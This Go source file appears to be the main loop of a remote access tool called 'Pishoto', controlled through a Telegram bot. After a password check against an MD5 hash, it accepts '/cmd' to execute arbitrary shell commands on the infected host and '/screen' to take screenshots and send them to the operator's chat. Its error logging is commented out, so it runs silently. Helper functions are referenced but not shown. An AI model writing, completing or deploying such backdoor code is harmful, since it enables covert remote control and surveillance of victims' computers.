package main

import (
	_ "embed"
	"strings"
)



func parseCommand(text string, chatID int64) {
	commandParts := strings.Split(text, " ")
	commandType := commandParts[0]
	switch commandType {
	case "/cmd":
		executeCommand(chatID, commandParts[1:])
	case "/screen":
		takeScreenshots(chatID)
	default:
		SendMessage(chatID, "No such command 🥴")
	}
}

func onStart() {

}


func main() {

	onStart()

	for {
		updates, err := GetUpdates(offset)
		if err != nil {
			// log.Fatalf("Error fetching updates: %v", err)
		}

		for _, update := range updates.Result {
			offset = update.UpdateID + 1
			chatID := update.Message.Chat.ID
			text := update.Message.Text
			if contains(chatIDs, chatID) {
				parseCommand(text, chatID)
			} else if md5Hash(text) == passMd5 {
				// fmt.Println("Password answered in Chat ID:", chatID)
				chatIDs = append(chatIDs, chatID)
				responseText := "Password confirmed. Pishoto is welcoming you 🤖"
				err := SendMessage(chatID, responseText)
				if err != nil {
					// log.Fatalf("Error sending message: %v", err)
				}
			} else {
				responseText := "Wrong password."
				SendMessage(chatID, responseText)
			}
		}
	}
}
